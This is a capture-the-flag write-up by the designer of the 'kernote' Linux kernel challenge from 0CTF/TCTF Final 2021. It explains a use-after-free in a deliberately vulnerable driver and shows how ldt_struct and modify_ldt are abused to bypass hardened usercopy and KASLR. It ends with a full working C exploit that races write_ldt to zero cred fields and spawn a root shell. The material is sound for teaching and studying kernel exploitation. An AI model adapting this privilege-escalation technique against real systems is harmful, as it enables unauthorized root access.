# Writeup for kernote in 0CTF/TCTF Final 2021

I've designed the kernel challenge `kernote` for 0CTF/TCTF 2021. This is a kernel uaf challenge in small slab.

## source code

```c
static long kernote_ioctl(struct file * __file, unsigned int cmd, unsigned long param)
{
    int ret;
    spin_lock(&spin);
    switch(cmd)
    {
        case KERN_SELECTNOTE:
            if(param>=16)
            {
                ret=-1;
                break;
            }
            note=buf[param];
            ret=0;
            break;
        case KERN_ADDNOTE:
            if(param>=16)
            {
                ret=-1;
                break;
            }
            buf[param]=kmalloc(8,GFP_KERNEL);
            if(!buf[param])
            {
                ret=-1;
                break;
            }
            ret=0;
            break;
        case KERN_DELNOTE:
            if(param>=16||!buf[param])
            {
                ret=-1;
                break;
            }
            kfree(buf[param]);
            buf[param]=NULL;
            ret=0;
            break;
        case KERN_EDITNOTE:
            if(!note)
            {
                ret=-1;
                break;
            }
            *note=param;
            ret=0;
            break;
        case KERN_SHOWNOTE:
            if(get_current_user()->uid.val!=0)
            {
                printk(KERN_INFO "[kernote] : ********\n");
                ret=-1;
                break;
            }
            if(!note)
            {
                printk(KERN_INFO "[kernote] : No note\n");
                ret=-1;
                break;
            }
            printk(KERN_INFO "[kernote] : 0x%lx\n",*note);
            ret=0;
    }
    spin_unlock(&spin);
    return ret;
}
```

Obviously, there is a uaf vulnerability. Use KERN_SELECTNOTE to save a heap pointer and you can still use KERN_EDITNOTE to edit it after it is freed. Because your uid cannot be 0(otherwise you can directly read the flag), you can never use KERN_SHOWNOTE to leak the content in the freed heap. 

## kernel config

Here are some important kernel config options.

```
CONFIG_SLAB=y
CONFIG_SLAB_FREELIST_RANDOM=y
CONFIG_SLAB_FREELIST_HARDENED=y
CONFIG_HARDENED_USERCOPY=y
CONFIG_STATIC_USERMODEHELPER=y
CONFIG_STATIC_USERMODEHELPER_PATH=""
```

I choose to use slab allocator instead of the default slub allocator to avoid freelist poisoning and let players focus on the small objects instead of heap allocator.

At the same time, the kmalloc minimum size is 32. 

```c
// include/linux/slab.h
#ifdef CONFIG_SLAB
#define KMALLOC_SHIFT_HIGH	((MAX_ORDER + PAGE_SHIFT - 1) <= 25 ? \
				(MAX_ORDER + PAGE_SHIFT - 1) : 25)
#define KMALLOC_SHIFT_MAX	KMALLOC_SHIFT_HIGH
#ifndef KMALLOC_SHIFT_LOW
#define KMALLOC_SHIFT_LOW	5
#endif
#endif

#ifndef KMALLOC_MIN_SIZE
#define KMALLOC_MIN_SIZE (1 << KMALLOC_SHIFT_LOW)
#endif
```

So, we have a uaf object in kmalloc-32, which we can modify the first 8 bytes.

About hardened usercopy, you can refer to [this post](https://lwn.net/Articles/695991/). Tl;dr, kernel will check the followings(in `__check_object_size`) before calling copy\_*\_user.

```c
// mm/usercopy.c
/*
 * Validates that the given object is:
 * - not bogus address
 * - fully contained by stack (or stack frame, when available)
 * - fully within SLAB object (or object whitelist area, when available)
 * - not in kernel text
 */
```

CONFIG_STATIC_USERMODEHELPER will substitute the path with a static string when calling call_usermodehelper, which will prevent the exploit of hijacking prctl_hook, modprobe_path and etc.

```c
struct subprocess_info *call_usermodehelper_setup(const char *path, char **argv,
		char **envp, gfp_t gfp_mask,
		int (*init)(struct subprocess_info *info, struct cred *new),
		void (*cleanup)(struct subprocess_info *info),
		void *data)
{
	struct subprocess_info *sub_info;
	sub_info = kzalloc(sizeof(struct subprocess_info), gfp_mask);
	if (!sub_info)
		goto out;

	INIT_WORK(&sub_info->work, call_usermodehelper_exec_work);

#ifdef CONFIG_STATIC_USERMODEHELPER
	sub_info->path = CONFIG_STATIC_USERMODEHELPER_PATH;
#else
	sub_info->path = path;
  ……
```

To sum up, we need a object to leak the kernel base address and try to control the cred struct or call commit_creds(prapare_kernel_cred(0))

## leak the kernel address (arbitrary read）

I choose to control [ldt_struct](https://elixir.bootlin.com/linux/latest/source/arch/x86/include/asm/mmu_context.h#L36) with the uaf vulnerability, with the size of 0x10 and is in the kmalloc-32.

```c
struct ldt_struct {
	struct desc_struct	*entries;
	unsigned int		nr_entries;
	int			slot;
};
```

The first 8 bytes(which is under our control) of the ldt_struct is a pointer and can be very useful in our exploit.

We can use [modify_ldt](https://elixir.bootlin.com/linux/latest/source/arch/x86/kernel/ldt.c#L665) syscall to play with ldt_struct.

```c
SYSCALL_DEFINE3(modify_ldt, int , func , void __user * , ptr ,
		unsigned long , bytecount)
{
	int ret = -ENOSYS;
	switch (func) {
	case 0:
		ret = read_ldt(ptr, bytecount);
		break;
	case 1:
		ret = write_ldt(ptr, bytecount, 1);
		break;
	case 2:
		ret = read_default_ldt(ptr, bytecount);
		break;
	case 0x11:
		ret = write_ldt(ptr, bytecount, 0);
		break;
	}
	return (unsigned int)ret;
}
```

And we can see that [read_ldt](https://elixir.bootlin.com/linux/latest/source/arch/x86/kernel/ldt.c#L500) directly call copy_to_user to copy the data current->mm->context.ldt->entries to user without any check.

```c
static int read_ldt(void __user *ptr, unsigned long bytecount)
{
	struct mm_struct *mm = current->mm;
	unsigned long entries_size;
	int retval;

  ……
  
	if (copy_to_user(ptr, mm->context.ldt->entries, entries_size)) {
		retval = -EFAULT;
		goto out_unlock;
	}

  ……
```

And in [write_ldt](https://elixir.bootlin.com/linux/latest/source/arch/x86/kernel/ldt.c#L576), we can set current->mm->context.ldt with new allocated ldt_structure.

```c
static int write_ldt(void __user *ptr, unsigned long bytecount, int oldmode)
{
	struct mm_struct *mm = current->mm;
	struct ldt_struct *new_ldt, *old_ldt;
	unsigned int old_nr_entries, new_nr_entries;
	struct user_desc ldt_info;
	struct desc_struct ldt;
	int error;

	error = -EINVAL;
	if (bytecount != sizeof(ldt_info))
		goto out;
	error = -EFAULT;
	if (copy_from_user(&ldt_info, ptr, sizeof(ldt_info)))
		goto out;

	……

	old_ldt       = mm->context.ldt;
	old_nr_entries = old_ldt ? old_ldt->nr_entries : 0;
	new_nr_entries = max(ldt_info.entry_number + 1, old_nr_entries);

	error = -ENOMEM;
	new_ldt = alloc_ldt_struct(new_nr_entries);

  ……
  
	install_ldt(mm, new_ldt);
	unmap_ldt_struct(mm, old_ldt);
	free_ldt_struct(old_ldt);
	error = 0;

out_unlock:
	up_write(&mm->context.ldt_usr_sem);
out:
	return error;
}
```

Then we can copy from arbitrary address with the following steps:

* Free a heap chunk in kmalloc-32
* Use write_ldt to get the freed chunk
* Use the uaf vulnerability to modify the entries pointer of the ldt_struct
* Call read_ldt to call copy_to_user on arbitrary address

Because copy_to_user won't panic the kernel when accessing wrong address, we can start to search from 0xffffffff80000000 by 0x200000. The poc is very simple

```c
fd=open("/dev/kernote",O_RDONLY);
ioctl(fd,KERN_ADDNOTE,0);
ioctl(fd,KERN_SELECTNOTE,0);
ioctl(fd,KERN_DELNOTE,0);
syscall(SYS_modify_ldt, 1, &u_desc,sizeof(u_desc));
addr=0xffffffff80000000;
while(1){
        ioctl(fd,KERN_EDITNOTE,addr);
        ret=syscall(SYS_modify_ldt, 0, target,8);
        if(ret<0){
            addr+=0x200000;
            continue;
        }
  			//found!
}
```

Run the poc and we can get

```shell
/ $ ./poc
[    4.979960] usercopy: Kernel memory exposure attempt detected from kernel text (offset 0, size 8)!
[    4.990426] ------------[ cut here ]------------
[    4.995110] kernel BUG at mm/usercopy.c:99!
[    4.998941] invalid opcode: 0000 [#1] SMP PTI
```

The kernel panic because we attempt to copy from the kernel text, blocked by hardened usercopy.

copy_to_user->check_copy_size->check_object_size->__check_object_size->check_kernel_text_object

```c
static inline void check_kernel_text_object(const unsigned long ptr,
					    unsigned long n, bool to_user)
{
	unsigned long textlow = (unsigned long)_stext;
	unsigned long texthigh = (unsigned long)_etext;
	unsigned long textlow_linear, texthigh_linear;

	if (overlaps(ptr, n, textlow, texthigh))
		usercopy_abort("kernel text", NULL, to_user, ptr - textlow, n);

	/*
	 * Some architectures have virtual memory mappings with a secondary
	 * mapping of the kernel text, i.e. there is more than one virtual
	 * kernel address that points to the kernel image. It is usually
	 * when there is a separate linear physical memory mapping, in that
	 * __pa() is not just the reverse of __va(). This can be detected
	 * and checked:
	 */
	textlow_linear = (unsigned long)lm_alias(textlow);
	/* No different mapping: we're done. */
	if (textlow_linear == textlow)
		return;

	/* Check the secondary mapping... */
	texthigh_linear = (unsigned long)lm_alias(texthigh);
	if (overlaps(ptr, n, textlow_linear, texthigh_linear))
		usercopy_abort("linear kernel text", NULL, to_user,
			       ptr - textlow_linear, n);
}
```

And the area between \_stext and \_etext is much greater than 0x200000, so that we can't just copy from the middle of 0x200000 to avoid the check. Thus, we cannot leak the kernel text base directly. 

However, we can try to leak the direct mapping address of all physical memory(page_offset_base). we can start to search from 0xffff888000000000 by 0x40000000

```shell
/ $ ./poc
page_offset_base: 0xffff89ba40000000
```

But the problem still exists. When we try to search task_struct or other contents in the direct mapping, we may also be blocked by hardened usercopy.

Notice that when calling fork, we will finally call ldt_dup_context 

(kernel_clone->copy_process->copy_mm->dup_mm->dup_mmap->arch_dup_mmap->ldt_dup_context)

```c
int ldt_dup_context(struct mm_struct *old_mm, struct mm_struct *mm)
{
	struct ldt_struct *new_ldt;
	int retval = 0;

	……

	memcpy(new_ldt->entries, old_mm->context.ldt->entries,
	       new_ldt->nr_entries * LDT_ENTRY_SIZE);
  
	……
    
}
```

We can see that, the kernel use memcpy to copy the content from  old_mm->context.ldt->entries to new_ldt->entries, which will not be blocked by hardened usercopy. So, we can read content from arbitrary address by following steps:

* Use uaf vulnerability to modify old_mm->context.ldt->entries in the parent process, pointing to the address we want to read
* Fork to copy the content to new_ldt->entries
* Call read_ldt in child process to call copy_to_user and get the content

The poc to search task_struct is as follows

```c
prctl(PR_SET_NAME, "0ops0ops0ops");
pid=getpid();
    pipe(pipefd);
    while(1){
        addr+=0x8000;
        ioctl(fd,KERN_EDITNOTE,addr);
        ret=fork();
        if(!ret){
            ret=syscall(SYS_modify_ldt, 0, buf,0x8000);
            unsigned long *search = (unsigned long *)buf;
            unsigned long long ans = 0;
            while ( (unsigned long)search < (unsigned long)buf+0x8000){
                search = memmem(search, (unsigned long)buf +0x8000- (unsigned long)search, "0ops0ops0ops", 12);
                if ( search == NULL )break;
                if ( (search[-2] > PAGE_OFFSET) && (search[-3] > PAGE_OFFSET )&&(int)search[-58]==pid){
                    printf("Found cred : %llx\n",search[-2]);
                    printf("Found pid: %d\n",search[-58]);
                    ans=search[-2];
                    break;
                }
                search+=12;
            }
            write(pipefd[1],&ans,8);
            exit(0);
        }
        wait(NULL);
        read(pipefd[0],&cred_addr,8);
        if(cred_addr)
        {
            break;
        }
    }
```

And we can get 

```shell
Found cred : ffff92c301398540
Found pid: 143
```

In the same way, we can leak the kernel text base and other important address.  

##  privilege escalation (arbitrary write)

Finally, I choose to zero out the uid, gid and etc. in cred structure to do the privilege escalation. Of course, it is possible to control other structure (e.g. seq_operations) to control rip and finally call commit_creds(prapare_kernel_cred(0)).

To achieve arbitrary write, I also use ldt_struct.

In write_ldt, there is a memcpy after alloc_ldt_struct.

```c
static int write_ldt(void __user *ptr, unsigned long bytecount, int oldmode)
{
  
  ……
  
	new_ldt = alloc_ldt_struct(new_nr_entries);
	if (!new_ldt)
		goto out_unlock;

	if (old_ldt)
		memcpy(new_ldt->entries, old_ldt->entries, old_nr_entries * LDT_ENTRY_SIZE);

	new_ldt->entries[ldt_info.entry_number] = ldt;

  ……
  
}
```

Notice that old_nr_entries can be at most 8191 and LDT_ENTRY_SIZE is 8, so the time window between alloc_ldt_struct and the following assignment is rather big. 

```c
// arch/x86/include/uapi/asm/ldt.h
/* Maximum number of LDT entries supported. */
#define LDT_ENTRIES	8192
/* The size of each LDT entry. */
#define LDT_ENTRY_SIZE	8
```

We can have a arbitrary write in the following steps:

* Free a heap chunk in kmalloc-32
* set old_nr_entries a big number and call write_ldt
* try to use uaf vulnerability to control the new_ldt->entries during memcpy
* achieve arbitrary write by `new_ldt->entries[ldt_info.entry_number] = ldt;`

I set euid and egid of the cred to 0, call setreuid(0,0) and setregid(0,0), and finally get root shell.

## final exploit

```c
#define _GNU_SOURCE
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
#include<fcntl.h>
#include <asm/ldt.h>         /* Definition of struct user_desc */
#include <sys/syscall.h>     /* Definition of SYS_* constants */
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <pthread.h>
#include<sys/sysinfo.h>
#include<sched.h>
#include<ctype.h>
#include<string.h>
#include <sys/prctl.h>
#include <sys/mman.h>
#define KERN_SELECTNOTE 0x6666
#define KERN_ADDNOTE 0x6667
#define KERN_DELNOTE 0x6668
#define KERN_EDITNOTE 0x6669
#define KERN_SHOWNOTE 0x666a
long long target[1];
long long zero;
struct user_desc u_desc;
int fd;
int flag;
int main()
{
    char *buf=(char *)mmap(NULL, 0x8000, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, 0, 0);
    prctl(PR_SET_NAME, "0ops0ops0ops");
    int pid=getpid();
    fd=open("/dev/kernote",O_RDONLY);
    u_desc.base_addr=0xff0000;
    u_desc.entry_number=0x8000/8;
    u_desc.limit=0;
    u_desc.seg_32bit=0;
    u_desc.contents=0;
    u_desc.read_exec_only=0;
    u_desc.limit_in_pages=0;
    u_desc.seg_not_present=0;
    u_desc.useable=0;
    u_desc.lm=0;
    ioctl(fd,KERN_ADDNOTE,0);
    ioctl(fd,KERN_SELECTNOTE,0);
    ioctl(fd,KERN_DELNOTE,0);
    int ret=syscall(SYS_modify_ldt, 1, &u_desc,sizeof(u_desc));
    unsigned long long addr=0xffff888000000000uLL;
    while(1){
        ioctl(fd,KERN_EDITNOTE,addr);
        ret=syscall(SYS_modify_ldt, 0, target,8);
        if(ret<0){
            addr+=0x40000000;
            continue;
        }
        printf("page_offset_base: %llx\n",addr);
        break;
    }
    unsigned long long PAGE_OFFSET=addr;
    int pipefd[2]={0};
    unsigned long long cred_addr=0;
    pipe(pipefd);
    while(1){
        addr+=0x8000;
        //ioctl(fd,0,addr);
        ioctl(fd,KERN_EDITNOTE,addr);
        ret=fork();
        if(!ret){
            ret=syscall(SYS_modify_ldt, 0, buf,0x8000);
            unsigned long *search = (unsigned long *)buf;
            unsigned long long ans = 0;
            while ( (unsigned long)search < (unsigned long)buf+0x8000){
                search = memmem(search, (unsigned long)buf +0x8000- (unsigned long)search, "0ops0ops0ops", 12);
                if ( search == NULL )break;
                if ( (search[-2] > PAGE_OFFSET) && (search[-3] > PAGE_OFFSET )&&(int)search[-58]==pid){
                    printf("Found cred : %llx\n",search[-2]);
                    printf("Found pid: %d\n",search[-58]);
                    ans=search[-2];
                    break;
                }
                search+=12;
            }
            write(pipefd[1],&ans,8);
            exit(0);
        }
        wait(NULL);
        read(pipefd[0],&cred_addr,8);
        if(cred_addr)
        {
            break;
        }
    }
    ioctl(fd,KERN_EDITNOTE,cred_addr+4);
    ret=fork();
    if(!ret){
        ret=fork();
        if(!ret)
        {
            cpu_set_t cpu_set;
            CPU_ZERO(&cpu_set);
            CPU_SET(0,&cpu_set);
            ret=sched_setaffinity(0,sizeof(cpu_set),&cpu_set);
            sleep(1);
            for(int i=1;i<15;i++){
                ioctl(fd,KERN_ADDNOTE,i);
            }
            ioctl(fd,KERN_SELECTNOTE,11);
            for(int i=1;i<15;i++)
            {
                ioctl(fd,KERN_DELNOTE,i);
            }
            CPU_ZERO(&cpu_set);
            CPU_SET(1,&cpu_set);
            sched_setaffinity(0,sizeof(cpu_set),&cpu_set);
            while(1)
            {
                ioctl(fd,KERN_EDITNOTE,cred_addr+4);
            }
        }
        cpu_set_t cpu_set;
        CPU_ZERO(&cpu_set);
        CPU_SET(0,&cpu_set);
        ret=sched_setaffinity(0,sizeof(cpu_set),&cpu_set);
        u_desc.base_addr=0;
        u_desc.entry_number=2;
        u_desc.limit=0;
        u_desc.seg_32bit=0;
        u_desc.contents=0;
        u_desc.read_exec_only=0;
        u_desc.limit_in_pages=0;
        u_desc.seg_not_present=0;
        u_desc.useable=0;
        u_desc.lm=0;
        sleep(3);
        ret=syscall(SYS_modify_ldt, 1, &u_desc,sizeof(u_desc));
        printf("%d\n",ret);
        sleep(100000);
    }
    sleep(5);
    printf("%d\n",geteuid());
    setreuid(0,0);
    setregid(0,0);
    system("/bin/sh");
}
```

## unintended mistakes

The intention of this challenge is to let players focus on the small slab objects in kernel and try to bypass kaslr when HARDENED_USERCOPY is on. However, I've made serveral mistakes 

* KERN_SHOWNOTE is designed just for fun, but I didn't use get_current_user() correctly, causing the refcount bigger and bigger. This unintended bug may mislead some players.
* I used linux kernel 5.11.9 I've built before for laziness, which is already end of life and sufffers from several cve vulnerabilities. Congratulats to @Balsn for a perfect 1 day exploit.
* I didn't notice that the kaslr on linux kernel text is just 9bits randomization. Congratulats to @organizers for brute forcing with a optimized binary. But, of course, there will be a proof of work next time.

## conclusion

It is my first time to design a kernel challenge for 0CTF/TCTF Final. I caused some unintended mistakes for the lack of enperience and I'm sorry for your inconvenience. However, I believe my solution to bypass kaslr with ldt_struct is novel and I hope you enjoy the challenge.
